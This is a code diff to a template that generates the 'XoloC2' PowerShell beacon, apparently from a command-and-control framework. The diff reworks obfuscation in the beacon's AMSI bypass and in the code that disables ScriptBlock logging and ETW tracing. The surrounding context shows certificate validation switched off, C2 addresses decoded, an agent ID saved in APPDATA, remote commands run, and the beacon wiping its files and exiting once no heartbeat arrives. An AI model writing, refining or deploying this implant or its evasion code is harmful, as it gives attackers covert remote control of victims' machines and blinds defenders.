@@ -5781,40 +5781,13 @@ $_REF=@("https://www.google.com/","https://www.bing.com/search?q=windows+update"
     ? `$wc.Headers['User-Agent']=$_UA[(Get-Random -Max $_UA.Count)]\n      $wc.Headers['Referer']=$_REF[(Get-Random -Max $_REF.Count)]\n      $wc.Headers['Accept']='text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'\n      $wc.Headers['Accept-Language']='en-US,en;q=0.5'`
     : '';
 
-  return `# XoloC2 PowerShell beacon
-# ── Decoder + Key (needed for bypass strings) ─────────────────────────────────
-function _D{param($h,$k)$b=New-Object byte[] ($h.Length/2);for($i=0;$i-lt$h.Length;$i+=2){$b[$i/2]=[Convert]::ToByte($h.Substring($i,2),16)};$ke=[Text.Encoding]::UTF8.GetBytes($k);$o=New-Object byte[] $b.Length;for($i=0;$i-lt$b.Length;$i++){$o[$i]=$b[$i]-bxor$ke[$i%$ke.Length]};[Text.Encoding]::UTF8.GetString($o)}
+  return `function _D{param($h,$k)$b=New-Object byte[] ($h.Length/2);for($i=0;$i-lt$h.Length;$i+=2){$b[$i/2]=[Convert]::ToByte($h.Substring($i,2),16)};$ke=[Text.Encoding]::UTF8.GetBytes($k);$o=New-Object byte[] $b.Length;for($i=0;$i-lt$b.Length;$i++){$o[$i]=$b[$i]-bxor$ke[$i%$ke.Length]};[Text.Encoding]::UTF8.GetString($o)}
 $_k="${xk}"
-# ── Layer 1: AMSI bypass ───────────────────────────────────────────────────────
-try{
-  $_aa=[Ref].Assembly.GetType((_D "${enc('System.Management.Automation.AmsiUtils')}" $_k))
-  $_ab=$_aa.GetField((_D "${enc('amsiInitFailed')}" $_k),(_D "${enc('NonPublic,Static')}" $_k))
-  $_ab.SetValue($null,$true)
-}catch{}
-# ── Layer 2: ScriptBlock logging disable ───────────────────────────────────────
-try{
-  $_la=[Ref].Assembly.GetType((_D "${enc('System.Management.Automation.Utils')}" $_k))
-  $_lb=$_la.GetField((_D "${enc('cachedGroupPolicySettings')}" $_k),(_D "${enc('NonPublic,Static')}" $_k))
-  if($_lb){
-    $_lc=$_lb.GetValue($null)
-    if($_lc -and $_lc[(_D "${enc('ScriptBlockLogging')}" $_k)]){
-      $_lc[(_D "${enc('ScriptBlockLogging')}" $_k)][(_D "${enc('EnableScriptBlockLogging')}" $_k)]=0
-      $_lc[(_D "${enc('ScriptBlockLogging')}" $_k)][(_D "${enc('EnableScriptBlockInvocationLogging')}" $_k)]=0
-    }
-  }
-}catch{}
-# ── Layer 3: ETW disable ───────────────────────────────────────────────────────
-try{
-  $pa=[Ref].Assembly.GetType((_D "${enc('System.Management.Automation.Tracing.PSEtwTracer')}" $_k))
-  if($pa){
-    $pf=$pa.GetField((_D "${enc('etwProvider')}" $_k),(_D "${enc('NonPublic,Static')}" $_k))
-    if($pf){$pv=$pf.GetValue($null);if($pv){$pm=$pv.GetType().GetField((_D "${enc('m_enabled')}" $_k),(_D "${enc('NonPublic,Instance')}" $_k));if($pm){$pm.SetValue($pv,[byte]0)}}}
-  }
-}catch{}
-# ── Layer 4: SSL + TLS ─────────────────────────────────────────────────────────
+try{$_aa=[Ref].Assembly.GetType(('Sy'+'stem.Ma'+'nagement.Au'+'tomation.Am'+'siU'+'tils'));$_ab=$_aa.GetField(('am'+'siIn'+'itF'+'ailed'),'NonPublic,Static');$_ab.SetValue($null,$true)}catch{}
+try{$_la=[Ref].Assembly.GetType(('Sy'+'stem.Ma'+'nagement.Au'+'tomation.U'+'tils'));$_lb=$_la.GetField(('cac'+'hedGrou'+'pPolic'+'ySet'+'tings'),'NonPublic,Static');if($_lb){$_lc=$_lb.GetValue($null);if($_lc -and $_lc['Sc'+'riptBlo'+'ckLog'+'ging']){$_lc['Sc'+'riptBlo'+'ckLog'+'ging']['En'+'ableScr'+'iptBlo'+'ckLog'+'ging']=0;$_lc['Sc'+'riptBlo'+'ckLog'+'ging']['En'+'ableScr'+'iptBlo'+'ckInvo'+'cationLog'+'ging']=0}}}catch{}
+try{$_pa=[Ref].Assembly.GetType(('Sy'+'stem.Ma'+'nagement.Au'+'tomation.Tr'+'acing.PSE'+'twTr'+'acer'));if($_pa){$_pf=$_pa.GetField('et'+'wPro'+'vider','NonPublic,Static');if($_pf){$_pv=$_pf.GetValue($null);if($_pv){$_pm=$_pv.GetType().GetField('m_'+'ena'+'bled','NonPublic,Instance');if($_pm){$_pm.SetValue($_pv,[byte]0)}}}}}catch{}
 [Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]'Tls12,Tls'
-# ── Config ─────────────────────────────────────────────────────────────────────
 $_k="${xk}"
 $C2=@(${eUrls})|%{_D $_ $_k}
 $SECRET=_D "${eSecret}" $_k
@@ -5823,14 +5796,11 @@ $JITTER=${jitter}
 $HB=${hbDays}
 $script:_last_ok=[DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
 ${uaDecl}${killDateBlock}${sandboxBlock}${persistBlock}
-# ── Agent ID (persisted) ───────────────────────────────────────────────────────
 $_idp=Join-Path $env:APPDATA (_D "${enc('.xolo_hid')}" $_k)
 if(Test-Path $_idp){$AID=(Get-Content $_idp -Raw -EA 0).Trim()}else{$AID=[Guid]::NewGuid().ToString();Set-Content $_idp $AID}
-# ── CWD ────────────────────────────────────────────────────────────────────────
 $_cwdp=Join-Path $env:APPDATA (_D "${enc('.xolo_cwd')}" $_k)
 if(Test-Path $_cwdp){$script:_cwd=(Get-Content $_cwdp -Raw -EA 0).Trim();if(!(Test-Path $script:_cwd -EA 0)){$script:_cwd=(Get-Location).Path}}else{$script:_cwd=(Get-Location).Path}
 function _SaveCwd{param($p)try{Set-Content $_cwdp $p}catch{}}
-# ── HTTP ───────────────────────────────────────────────────────────────────────
 function _Post{param($path,$body)
   $json=ConvertTo-Json $body -Compress -Depth 5
   $bytes=[Text.Encoding]::UTF8.GetBytes($json)
@@ -5857,7 +5827,6 @@ function _Get{param($path)
   }
   return $null
 }
-# ── Commands ───────────────────────────────────────────────────────────────────
 function _Run{param($cmd,$tid)
   $cmd=$cmd.Trim()
   if($cmd -eq 'info'){
@@ -5927,7 +5896,6 @@ function _Run{param($cmd,$tid)
     return '(no output)'
   }catch{return "Error: $_"}
 }
-# ── Main loop ──────────────────────────────────────────────────────────────────
 while($true){${killDateLoop}
   if($HB -gt 0 -and ([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()-$script:_last_ok) -gt $HB*86400){
     Remove-Item $_idp,$_cwdp -EA 0;exit
